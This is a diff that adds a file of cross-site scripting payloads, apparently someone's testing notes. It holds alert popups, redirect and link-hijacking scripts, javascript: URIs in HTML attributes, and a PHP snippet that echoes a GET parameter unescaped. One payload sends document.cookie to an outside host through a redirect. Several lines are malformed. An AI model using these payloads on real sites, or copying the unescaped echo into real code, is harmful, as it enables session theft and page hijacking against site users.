@@ -1,0 +1,44 @@
+<script>alert( 	
+"XSS")</script> 	
+
+<script>window.open("abv.bg");
+
+<script>window.open('http://abv.bg');</script>
+
+<script>window.location='abv.bg'
+
+
+
+
+<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="www.blog.com";}</script>
+
+<script>alert("XSS")</script>
+
+<h1>XSS test</h1>
+Some text here <a href="www.blog.com">XSS Hack</a> Some more text here...
+
+<?php
+$name = $_GET['test'];
+echo "Welcome $name<br>";
+echo "<a href="www.blog.com">Click to XSS</a>";
+?>
+
+<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="www.blog.com";}</script>
+
+<SCRIPT> alert(“XSS”); </SCRIPT>
+
+<script>
+window.location='http://www.blog.com/?cookie='+document.cookie
+</script>
+
+<BODY BACKGROUND="javascript:alert('XSS')">
+
+<IMG SRC="javascript:alert('XSS');">
+
+<TD BACKGROUND="javascript:alert('XSS')">
+
+index.php?name=<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="www.blog.com";}</script
+
+<a href="javascript:<script>alert("XSS");</script>">home page</a>
+
+<TABLE BACKGROUND="javascript:alert('XSS')">
